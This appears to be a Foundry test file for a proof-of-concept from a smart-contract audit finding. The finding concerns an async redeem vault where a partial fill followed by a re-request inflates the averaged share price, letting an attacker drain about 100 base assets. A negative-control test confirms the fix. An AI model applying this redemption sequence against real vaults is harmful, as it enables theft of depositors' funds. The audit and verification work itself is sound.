// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    AccountableAsyncRedeemVault,
    AccountableAsyncRedeemVaultFixed,
    MiniToken,
    Math,
    ProcessingMode
} from "./62971-partial-redemptions-can-be-used-to-steal-assets-cyfrin-none.sol";

contract PartialRedemptionStealTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant PRECISION = 1e18;
    uint256 internal constant PRICE = 2 * 1e18;
    uint256 internal constant SHARES = 100 ether;
    uint256 internal constant PARTIAL = 50 ether;

    // Deterministic outcomes of the finding's exact 100/partial-50/re-100 scenario:
    //   fair            = 200 shares * price 2                 = 400e18
    //   buggy credited  = 100e18 + 150e18*(400e18/150e18)/1e18 = 499999999999999999900
    //   stolen surplus  = buggy - fair                         =  99999999999999999900 (~100e18)
    uint256 internal constant FAIR = 400 ether;
    uint256 internal constant BUGGY_CREDITED = 499999999999999999900;
    uint256 internal constant STOLEN = 99999999999999999900;

    function test_exploit_partialRedemptionInflatesSharePrice_stealsAssets() public {
        Exploit e = new Exploit();
        e.run();

        // The averaged sharePrice is inflated by the stale totalValue, so the
        // controller is credited ~500 assets for 200 shares truly worth 400.
        assertEq(e.fairCredited(), FAIR, "fair entitlement = 400");
        assertEq(e.buggyCredited(), BUGGY_CREDITED, "buggy over-credit ~500");
        assertGt(e.buggyCredited(), e.fairCredited(), "controller credited more than fair");

        // Concrete harm: the surplus (~100 base assets) is drained from the
        // pooled vault assets to the attacker EOA.
        assertEq(e.stolenAssets(), STOLEN, "stolen surplus ~100");
        assertEq(e.attackerBalance(), STOLEN, "attacker received stolen surplus");
        assertEq(e.vaultBefore() - e.vaultAfter(), STOLEN, "vault pool drained by the surplus");

        // The stolen surplus is ~25% on top of the 400 fair value (100/400).
        assertGt(e.stolenAssets(), 99 ether, "surplus is ~100, not dust");

        // Sanity: the drained token is the vault's real custodied base asset.
        MiniToken asset = MiniToken(e.assetAddr());
        assertEq(asset.balanceOf(ATTACKER), STOLEN, "attacker holds the stolen base asset");
    }

    // Negative control: the fixed _reduce() also decrements request.totalValue,
    // so re-requesting averages honestly and the controller is credited exactly
    // the fair 400 — nothing is stealable.
    function test_control_fixedReduce_creditsFairValue_noTheft() public {
        MiniToken asset = new MiniToken("Base Asset", "ASSET");
        AccountableAsyncRedeemVaultFixed vault =
            new AccountableAsyncRedeemVaultFixed(address(asset), PRECISION, ProcessingMode.RequestPrice);

        asset.mint(address(vault), 1_000_000 ether);

        // Same sequence as the exploit: request 100, partial-fill 50, re-request 100, full-fill.
        vault.requestRedeem(address(this), SHARES, PRICE);
        vault.fulfillRedeemRequest(address(this), PARTIAL);
        vault.requestRedeem(address(this), SHARES, PRICE);
        (uint256 remShares,,) = vault.requestOf(address(this));
        vault.fulfillRedeemRequest(address(this), remShares);

        uint256 credited = vault.maxWithdraw(address(this));
        uint256 fair = (PARTIAL + remShares) * PRICE / PRECISION;

        assertEq(fair, FAIR, "fair entitlement = 400");
        assertEq(credited, FAIR, "fixed path credits exactly the fair 400");
        assertEq(credited, fair, "no over-credit under the fix");

        // No surplus exists: attempting to withdraw even 1 wei beyond fair reverts.
        vm.expectRevert(bytes("exceeds maxWithdraw"));
        vault.withdraw(ATTACKER, credited + 1);
    }
}
